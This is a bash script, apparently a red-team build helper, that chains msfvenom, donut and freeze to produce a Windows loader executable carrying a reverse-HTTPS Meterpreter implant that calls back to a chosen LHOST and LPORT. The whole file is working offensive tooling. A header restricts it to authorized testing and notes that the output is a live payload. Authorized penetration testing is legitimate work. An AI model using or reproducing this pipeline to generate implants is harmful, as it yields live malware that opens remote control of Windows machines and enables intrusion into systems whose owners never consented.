#!/usr/bin/env bash
#
# payload-forge.sh - guided msfvenom -> donut -> freeze build helper
# -----------------------------------------------------------------------------
# Orchestrates the three installed tools to build a Windows payload, running
# each tool with its standard documented flags and saving artifacts to one dir:
#   1. msfvenom : raw shellcode for your chosen payload/LHOST/LPORT (or use -r).
#   2. donut    : PE/shellcode -> position-independent shellcode (.bin).
#   3. freeze   : shellcode -> loader .exe (uses freeze's own defaults).
# It prints each command before running so you stay in control.
# -----------------------------------------------------------------------------
# AUTHORIZED RED-TEAM / LAB / HACKATHON USE ONLY. The output is a live payload;
# generating implants for systems you are not cleared to test is illegal.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./payload-forge.sh -l <LHOST> -p <LPORT> [-P msf_payload] [-r raw.bin] [-o name]
#
# DEPENDENCIES: msfvenom, donut, freeze (all installed on this image)
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_warn(){ printf '\033[1;33m[!]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
c_step(){ printf '\n\033[1;36m===== %s =====\033[0m\n' "$*"; }
run(){ printf '\033[0;37m$ %s\033[0m\n' "$*"; "$@"; }
have(){ command -v "$1" >/dev/null 2>&1; }

LHOST="" LPORT="" MSFP="windows/x64/meterpreter/reverse_https" RAW="" NAME=""
usage(){ sed -n '2,22p' "$0"; exit 1; }
while getopts "l:p:P:r:o:h" o; do case "$o" in
  l) LHOST=$OPTARG;; p) LPORT=$OPTARG;; P) MSFP=$OPTARG;; r) RAW=$OPTARG;; o) NAME=$OPTARG;; *) usage;;
esac; done

NAME=${NAME:-"forge_$(date +%Y%m%d_%H%M%S)"}; OUT="./$NAME"; mkdir -p "$OUT"; cd "$OUT"
c_info "Output dir: $(pwd)"

# ---- stage 1: shellcode ----------------------------------------------------
SC=shellcode.bin
if [ -n "$RAW" ]; then
  cp "$RAW" "$SC"; c_ok "Using supplied raw shellcode: $RAW"
else
  [ -z "$LHOST" ] || [ -z "$LPORT" ] && { c_err "need -l and -p (or -r raw.bin)"; usage; }
  have msfvenom || { c_err "msfvenom not found"; exit 1; }
  c_step "msfvenom: $MSFP"
  run msfvenom -p "$MSFP" LHOST="$LHOST" LPORT="$LPORT" -f raw -o "$SC" || { c_err "msfvenom failed"; exit 1; }
  c_ok "raw shellcode -> $SC"
fi

# ---- stage 2: donut --------------------------------------------------------
if have donut; then
  c_step "donut: position-independent shellcode"
  run donut -i "$SC" -o donut.bin -a 2 || c_warn "donut failed (continuing with raw shellcode)"
  [ -f donut.bin ] && { SC=donut.bin; c_ok "donut shellcode -> donut.bin"; }
else
  c_warn "donut not found - skipping"
fi

# ---- stage 3: freeze -------------------------------------------------------
if have freeze; then
  c_step "freeze: loader .exe"
  run freeze -I "$SC" -O loader.exe 2>&1 | tail -6 || c_warn "freeze failed - see output above"
  [ -f loader.exe ] && c_ok "loader -> $(pwd)/loader.exe"
else
  c_warn "freeze not found - skipping (your shellcode is still in $SC)"
fi

c_step "DONE"
c_ok "Artifacts in $(pwd):"; ls -la | sed 's/^/   /'
c_info "Start a handler for $MSFP, e.g.: listener.sh -m -P '$MSFP' -l ${LHOST:-LHOST} -p ${LPORT:-LPORT}"
